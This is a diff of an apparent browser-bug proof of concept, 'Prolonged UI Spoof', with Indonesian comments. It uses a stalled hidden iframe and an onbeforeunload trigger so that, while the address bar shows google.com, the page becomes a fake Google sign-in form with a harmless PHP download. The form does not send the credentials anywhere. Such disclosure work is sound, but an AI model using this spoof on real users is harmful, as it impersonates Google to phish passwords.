@@ -2,66 +2,55 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>PoC 2 - Prolonged UI Spoof</title>
 </head>
 <body>
   <div id="content">
-    <h1>Step 2: Waiting for navigation...</h1>
-    <p>Ketik <b>https://google.com:9090</b> di omnibox dan tekan Enter.</p>
-    <div id="downloadLink" style="display: none;">
-      <p>Download file contoh:</p>
-      <a href="#" id="downloadBtn">Download File</a>
-    </div>
+    <h1>Step 2</h1>
+    <p>Ketik <b>https://google.com:9090</b> di omnibox lalu tekan Enter</p>
   </div>
 
   <script>
     let triggered = false;
 
-    // Cek apakah URL adalah https://google.com:9090
-    if (window.location.href === "https://google.com:9090/") {
-      document.getElementById("downloadLink").style.display = "block";  // Tampilkan link download
-    }
-
-    // Iframe untuk mensimulasikan loading lama
-    let iframe = document.createElement('iframe');
-    iframe.src = "https://google.com:9090";  // Non-routable IP
-    iframe.style.display = "none";  // Tidak terlihat
+    // iframe untuk bikin loading "macet"
+    const iframe = document.createElement("iframe");
+    iframe.src = "https://google.com:9090";
+    iframe.style.display = "none";
     document.body.appendChild(iframe);
 
+    // TRIGGER UTAMA (ENTER di omnibox)
     window.onbeforeunload = function () {
       triggered = true;
     };
 
-    // Handle download file secara dinamis saat link diklik
-    document.getElementById('downloadBtn').addEventListener('click', function() {
-      const blob = new Blob([`
-<?php
-// File PHP dinamis yang dapat didownload
-header('Content-Type: text/plain');
-header('Content-Disposition: attachment; filename="file_example.txt"');
-echo "Ini adalah file contoh yang bisa diunduh.\n";
-echo "Ini adalah baris kedua dari file.\n";
-?>
-      `], { type: 'application/php' });
-
-      const link = document.createElement('a');
-      link.href = URL.createObjectURL(blob);
-      link.download = 'download.php';  // Nama file yang diunduh
-      link.click();  // Trigger download
-    });
-
     setInterval(() => {
       if (triggered) {
         document.getElementById("content").innerHTML = `
-          <h1>Example Login Page</h1>
-          <p>Session Anda telah berakhir, login untuk melanjutkan.</p>
-          <input placeholder="Email"><br><br>
-          <input type="password" placeholder="Password">
+          <h1>Google Account</h1>
+          <p>Your session expired. Please sign in again.</p>
+
+          <input placeholder="Email" style="display:block;margin-bottom:10px">
+          <input type="password" placeholder="Password" style="display:block;margin-bottom:15px">
+
+          <button onclick="downloadPHP()">Continue</button>
         `;
         triggered = false;
       }
-    }, 50);  // Update konten tiap 50ms
+    }, 30);
+
+    // DOWNLOAD PHP (dibuat sendiri, tanpa server)
+    function downloadPHP() {
+      const php = `<?php
+echo "wkwkwk ini file php bebas 😁";
+?>`;
+
+      const blob = new Blob([php], { type: "application/php" });
+      const a = document.createElement("a");
+      a.href = URL.createObjectURL(blob);
+      a.download = "login.php";
+      a.click();
+    }
   </script>
 </body>
 </html>
